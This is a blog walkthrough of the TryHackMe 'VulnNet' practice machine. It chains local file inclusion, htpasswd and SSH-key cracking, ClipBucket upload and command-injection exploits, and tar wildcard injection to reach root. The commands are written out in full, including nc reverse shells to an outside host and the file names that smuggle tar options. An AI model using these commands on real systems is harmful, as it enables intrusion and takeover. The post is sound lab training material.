---
layout: post
title: TryHackMe Walkthrough - VulnNet
date: 2021-06-06
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Boot2Root
- Medium
- Machine
permalink: /2021/06/VulnNet
img: 2021/06/VulnNet/VulnNet.png
---

This is my walkthrough for the [VulnNet](https://tryhackme.com/room/vulnnet1) room on TryHackMe. In this room, I got to abuse vulnerabilities with [LFI](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/), a [CMS](https://clipbucket.com/) and [tar](https://en.wikipedia.org/wiki/Tar_(computing)). This room is of medium difficulty. It sent me on a few tangent, looking to things that were not exploitable. 

* Room: VulnNet
* Difficulty: Medium
* URL: https://tryhackme.com/room/vulnnet1
* Author: https://www.tryhackme.com/p/TheCyb3rW0lf

```
The purpose of this challenge is to make use of more realistic techniques and include them into a single machine to practice your skills.

Difficulty: Medium
Web Language: PHP

=> You will have to add a machine IP with domain vulnnet.thm to your /etc/hosts
```

## Opened Ports

I always start attacking machines by looking for opened ports

![RustScan](/assets/images/2021/06/VulnNet/01-Rustscan.png "RustScan")

Only two ports are opened on the target machine: 22 (ssh) and 80 (http).

## Web Site

I added vulnnet.thm to my hosts file as the room description says. Then I opened Burp and Firefox and started looking at the web site on port 80.

![Web Site](/assets/images/2021/06/VulnNet/02-WebSite.png "Web Site")

The site consist of mostly HTML pages. There is a 'Sign In' link, but when you enter any credentials, some JavaScript code display an error, then reload the same page. 

There is also a 'Subscribe' button, but it just reload the page without submitting the entered data.

I then looked at the JavaScript code loaded by the page. One of the file was adding a 'referer' parameter to the query string.

```javascript
n.p="http://vulnnet.thm/index.php?referer=",n(n.s=0)
```

The room description was mentioning LFI so I tried using this to load a file. 

I tried going to [http://vulnnet.thm/index.php?referer=/etc/passwd](http://vulnnet.thm/index.php?referer=/etc/passwd). I didn't get an error, but the content of the file wasn't there either. 

Then I looked at the [page source](view-source:http://vulnnet.thm/index.php?referer=/etc/passwd). 

![/etc/passwd](/assets/images/2021/06/VulnNet/03-LFIEtcPasswd.png "/etc/passwd")

The file inclusion worked. After that, I loaded the source code for the index.php file. Since the PHP code will be interpreted, I extracted it as base64 with PHP filters, and then decode it back to PHP.

I loaded the source of  [http://vulnnet.thm/index.php?referer=php://filter/convert.base64-encode/resource=index.php](http://vulnnet.thm/index.php?referer=php://filter/convert.base64-encode/resource=index.php) , and saved the base64 string to file called index.b64. The decoded it. 

```bash
cat index.b64 | base64 -d > index.php
```

The file contains mostly HTML, except at the end. 

```php
<?php
$file = $_GET['referer'];
$filter = str_replace('../','',$file);
include($filter);
?>
```

It will include any file we pass as the referer. Only removing `../`. I can easily bypass that by using absolute paths.

Next I tried loading the Apache logs to see if I could use log poisoning, this didn't work. I loaded `/etc/hosts` and found the host `broadcast.vulnnet.thm`. I tried going to it, but it was protected by basic auth and I didn't have any credentials. 

Next I tried looking at the [vhost information](view-source:http://vulnnet.thm/index.php?referer=/etc/apache2/sites-enabled/000-default.conf).
 
 ```
 <VirtualHost *:80>
	ServerAdmin webmaster@localhost
	ServerName vulnnet.thm
	DocumentRoot /var/www/main
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
	<Directory /var/www/main>
		Order allow,deny
		allow from all
	</Directory>
</VirtualHost>

<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	ServerName broadcast.vulnnet.thm
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
	<Directory /var/www/html>
		Order allow,deny
		allow from all
		AuthType Basic
		AuthName "Restricted Content"
		AuthUserFile /etc/apache2/.htpasswd
		Require valid-user
	</Directory>
</VirtualHost>
 ```
 
 This confirmed what I already knew, there is a site at `broadcast.vulnnet.thm`. But it also show that the basic auth credentials are stored in `/etc/apache2/.htpasswd`.
 
I loaded that [file with the LFI]( view-source:http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd) vulnerability. It contained only one line.
 
 ```
 developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
 ```

I used the [hashcat Example Hashes page]( https://hashcat.net/wiki/doku.php?id=example_hashes) to identify the hash type, and the mode to use. Then started hashcat to brute force the password.

```bash
hashcat -a0 -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...
...
Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1
...
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385
...

$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0:PASSWORD
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
Hash.Target......: $apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
Time.Started.....: Sun Jun  6 17:48:58 2021 (6 mins, 2 secs)
Time.Estimated...: Sun Jun  6 17:55:00 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     6558 H/s (5.35ms) @ Accel:64 Loops:250 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2169344/14344385 (15.12%)
Rejected.........: 0/2169344 (0.00%)
Restore.Point....: 2169216/14344385 (15.12%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000
Candidates.#1....: 9981953 -> 9972712937

Started: Sun Jun  6 17:48:56 2021
Stopped: Sun Jun  6 17:55:01 2021
```

## ClipBucket

Once hashcat cracked the password, I used those credentials to go to the site on  [http://broadcast.vulnnet.thm/](http://broadcast.vulnnet.thm/). 

![ClipBucket](/assets/images/2021/06/VulnNet/04-BroadcastSite.png "ClipBucket")

I looked around the site to see if I could find any glaring vulnerabilities. I tried to create an account, but it failed. 

Eventually, I looked on Exploit Database and found [multiple vulnerabilities](https://www.exploit-db.com/exploits/44250). The vulnerability works for version of ClipBucket that are smaller than '4.0.0 - Release 4902'. The source of the site say it's version 4.0.0, but does not say which release. So I tried the exploit on it. 

I first tried the command injection. 
```bash

$ curl -H "Authorization: Basic CREDENTIALS" -F "Filedata=@pfile.png" -F "file_name=aa.php ||nc 10.13.3.36 4444" http://broadcast.vulnnet.thm/api/file_uploader.php

{"success":"yes","file_name":"aa.php ||nc 10.13.3.36 4444"}
```
It returns a success, but I couldn't get the command to work. It never connected to my netcat listener.

After that, I tried the file upload vulnerability to push a PHP reverse shell.

```bash
curl -H "Authorization: Basic CREDENTIALS" -F "file=@shell.php" -F "plupload=1" -F "name=shell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"

{"success":"yes","file_name":"162298400499316a","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR"}
```

Again, I got a success, but I had no idea where the `CB_BEATS_UPLOAD_DIR` folder was. 

I searched on the site and couldn't find it. Then by searching on DuckDuckGo, I found the documentation to the [metasploit module](https://github.com/iagox86/metasploit-framework-webexec/blob/master/documentation/modules/exploit/multi/http/clipbucket_fileupload_exec.md) that showed that it was under `/actions/`. 

I started netcat listener and naviaged to [http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/162298400499316a.php](http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/162298400499316a.php) and I got my shell on the machine.

```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.186.11 51072
Linux vulnnet 4.15.0-134-generic #138-Ubuntu SMP Fri Jan 15 10:52:18 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 14:56:00 up  1:35,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

## Escalate To server-management

I stabilized the shell and started looking around the server. 

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

CTRL-z
stty raw -echo;fg
```

I looked in the web site and found the database configuration.
```bash
ww-data@vulnnet:/$ cd /var/www/html/
www-data@vulnnet:/var/www/html$ vi includes/dbconnect.php 
```

It contained the credentials to connect to the database. 
```php
$BDTYPE = 'mysql';^M
//Database Host^M
$DBHOST = '';^M
//Database Name^M
$DBNAME = 'VulnNet';^M
//Database Username^M
$DBUSER = 'admin';^M
//Database Password^M
$DBPASS = 'PASSWORD';^M
```

I tried the password to run `sudo` as www-data, and to su to the user server-management and root. It failed. I then connected to the database and looked around. I went through all the tables, but did not find anything. I looked at the other files of the application, still nothing.

Then I looked around the server. The `/var/backups` folder add a file that belongs to server-management. 

```bash
www-data@vulnnet:/var/www/html$ ls -la /var/backups/
total 2348
drwxr-xr-x  2 root              root                 4096 Jun  6 13:26 .
drwxr-xr-x 14 root              root                 4096 Jan 23 14:20 ..
-rw-r--r--  1 root              root                51200 Jan 23 14:07 alternatives.tar.0
-rw-r--r--  1 root              root                13896 Jan 23 16:00 apt.extended_states.0
-rw-r--r--  1 root              root                   11 Jan 23 13:39 dpkg.arch.0
-rw-r--r--  1 root              root                   43 Jan 23 13:39 dpkg.arch.1.gz
-rw-r--r--  1 root              root                   43 Jan 23 13:39 dpkg.arch.2.gz
-rw-r--r--  1 root              root                  280 Jan 23 14:01 dpkg.diversions.0
-rw-r--r--  1 root              root                  160 Jan 23 14:01 dpkg.diversions.1.gz
-rw-r--r--  1 root              root                  160 Jan 23 14:01 dpkg.diversions.2.gz
-rw-r--r--  1 root              root                  265 Jan 23 14:20 dpkg.statoverride.0
-rw-r--r--  1 root              root                  195 Jan 23 14:20 dpkg.statoverride.1.gz
-rw-r--r--  1 root              root                  179 Jan 23 13:53 dpkg.statoverride.2.gz
-rw-r--r--  1 root              root              1402383 Jan 25 23:27 dpkg.status.0
-rw-r--r--  1 root              root               386206 Jan 23 16:00 dpkg.status.1.gz
-rw-r--r--  1 root              root               366251 Jan 23 13:58 dpkg.status.2.gz
-rw-------  1 root              root                  857 Jan 23 22:10 group.bak
-rw-------  1 root              shadow                712 Jan 23 22:10 gshadow.bak
-rw-------  1 root              root                 1831 Jan 23 16:00 passwd.bak
-rw-------  1 root              shadow               1118 Jan 23 22:19 shadow.bak
-rw-rw-r--  1 server-management server-management    1484 Jan 24 14:08 ssh-backup.tar.gz
-rw-r--r--  1 root              root                49338 Jan 25 23:28 vulnnet-Monday.tgz
-rw-r--r--  1 root              root                49338 Jun  6 16:46 vulnnet-Sunday.tgz
```

I looked into the file, and it contained a ssh private key. So I copied it to the same folder where my reverse shell was and [downloaded it](http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/id_rsa)
```bash
www-data@vulnnet:/var/www/html$ cp /var/backups/ssh-backup.tar.gz /tmp/
www-data@vulnnet:/var/www/html$ cd /tmp/
www-data@vulnnet:/tmp$ gunzip ssh-backup.tar.gz 
www-data@vulnnet:/tmp$ tar -xvf ssh-backup.tar 
id_rsa
www-data@vulnnet:/tmp$ file id_rsa 
id_rsa: PEM RSA private key
www-data@vulnnet:/tmp$ cp id_rsa /var/www/html/actions/CB_BEATS_UPLOAD_DIR/
```

Once I had the key locally, I tried to use it to connect back to the server as the user server-management. But it needed a passphrase. 

```bash
$ chmod 600 id_rsa 

$ ssh server-management@vulnnet.thm -i id_rsa 
The authenticity of host 'vulnnet.thm (10.10.186.11)' can't be established.
ECDSA key fingerprint is SHA256:o3DFbZLKgDIjKXw0C1ptP4MVaCWwTGjXMpOhpnaus+8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'vulnnet.thm,10.10.186.11' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
```

I tried the database password, and the one for the developers user. They did not work. So I was back to brute forcing. 


```bash
$ python2 /usr/share/john/ssh2john.py id_rsa > john.hash

$ john john.hash -w=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
PASSPHRASE     (id_rsa)
1g 0:00:00:09 DONE (2021-06-06 10:53) 0.1091g/s 1565Kp/s 1565Kc/s 1565KC/sa6_123..*7¡Vamos!
Session completed
```

I could now connect to the server with ssh. And read the first flag.
```bash
$ ssh server-management@vulnnet.thm -i id_rsa 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-134-generic x86_64)

...

server-management@vulnnet:~$ ls -la
total 108
drwxrw---- 18 server-management server-management 4096 Jan 24 14:05 .
drwxr-xr-x  3 root              root              4096 Jan 23 13:58 ..
lrwxrwxrwx  1 root              root                 9 Jan 23 20:49 .bash_history -> /dev/null
-rw-r--r--  1 server-management server-management  220 Jan 23 13:58 .bash_logout
-rw-r--r--  1 server-management server-management 3771 Jan 23 13:58 .bashrc
drwxrwxr-x  8 server-management server-management 4096 Jun  6 16:53 .cache
drwxrwxr-x 14 server-management server-management 4096 Jan 23 14:03 .config
drwx------  3 server-management server-management 4096 Jan 23 14:03 .dbus
drwx------  2 server-management server-management 4096 Jan 23 14:03 Desktop
-rw-r--r--  1 server-management server-management   26 Jan 23 14:03 .dmrc
drwxr-xr-x  2 server-management server-management 4096 Jan 23 21:55 Documents
drwxr-xr-x  2 server-management server-management 4096 Jan 23 22:14 Downloads
drwx------  3 server-management server-management 4096 Jan 23 14:03 .gnupg
drwxrwxr-x  3 server-management server-management 4096 Jan 23 14:03 .local
drwx------  5 server-management server-management 4096 Jan 23 14:14 .mozilla
drwxr-xr-x  2 server-management server-management 4096 Jan 23 14:03 Music
drwxr-xr-x  2 server-management server-management 4096 Jan 23 14:03 Pictures
-rw-r--r--  1 server-management server-management  807 Jan 23 13:58 .profile
drwxr-xr-x  2 server-management server-management 4096 Jan 23 14:03 Public
drwx------  2 server-management server-management 4096 Jan 24 14:09 .ssh
-rw-r--r--  1 server-management server-management    0 Jan 23 14:04 .sudo_as_admin_successful
drwxr-xr-x  2 server-management server-management 4096 Jan 23 14:03 Templates
drwx------  4 server-management server-management 4096 Jan 23 19:58 .thumbnails
-rw-------  1 server-management server-management   38 Jan 23 22:12 user.txt
drwxr-xr-x  2 server-management server-management 4096 Jan 23 14:03 Videos
-rw-------  1 server-management server-management   52 Jan 24 14:05 .Xauthority
-rw-r--r--  1 server-management server-management   14 Feb 12  2018 .xscreensaver
-rw-------  1 server-management server-management 2586 Jan 24 14:05 .xsession-errors
-rw-------  1 server-management server-management 2586 Jan 23 22:17 .xsession-errors.old

server-management@vulnnet:~$ cat user.txt 
USER FLAG
```

## Getting Root

The first thing that caught my eyes in the home folder is the `.mozilla` directory. The Firefox profiles often contains credentials that can be read with [Firefox Decrypt](https://github.com/Unode/firefox_decrypt). I archived and compressed the .mozilla folder.

```bash
$ tar -cvf ffProfile.tar .mozilla/
$ gzip ffProfile.tar
```

Then I downloaded it to my machine to try and extract some passwords.

```bash

$ scp -i id_rsa server-management@vulnnet.thm:~/ffProfile.tar.gz .
Enter passphrase for key 'id_rsa': 
ffProfile.tar.gz                                100% 1793KB 528.6KB/s   00:03    

$ gunzip ffProfile.tar.gz 

$ tar -xvf ffProfile.tar 

$ python3 firefox_decrypt-master/firefox_decrypt.py .mozilla/firefox/
2021-06-06 11:12:21,873 - ERROR - Couldn't find credentials file (logins.json or signons.sqlite).
```
It failed. 

Next, I found some PDFs in the Documents folder. I downloaded them thinking they might contains something interesting. I looked at them, ran binwalk, strings, and exiftool. I did not find anything in them.

Then I looked at the crontab file. 

```bash
cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/2   * * * *   root    /var/opt/backupsrv.sh
```

It runs a backup script as root every two minutes. The script was not writable, so looked at what it did to see if I could exploit it. 

```bash
server-management@vulnnet:~$ ls -l /var/opt/backupsrv.sh
-rwxr--r-- 1 root root 530 Jan 23 21:30 /var/opt/backupsrv.sh

server-management@vulnnet:~$ cat /var/opt/backupsrv.sh
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```

The script runs tar on `/home/server-management/Documents/*`. This can be used to [run commands](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/) as the user executing the script.

I created the files needed to run my reverse shell.
```bash
server-management@vulnnet:~$ cd Documents/

server-management@vulnnet:~/Documents$ echo "mkfifo /tmp/kirxhbg; nc 10.13.3.36 4445 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg" > shell.sh

server-management@vulnnet:~/Documents$ echo "" > "--checkpoint-action=exec=sh shell.sh"

server-management@vulnnet:~/Documents$ echo "" > --checkpoint=1
```


Then I launched another netcat listener on my machine and waited for the connection.
```bash
ehogue@kali:~/Kali/OnlineCTFs/TryHackMe/VulnNet$ nc -lvnp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.186.11 33276

whoami
root

ls /root
root.txt

cat /root/root.txt
ROOT FLAG
```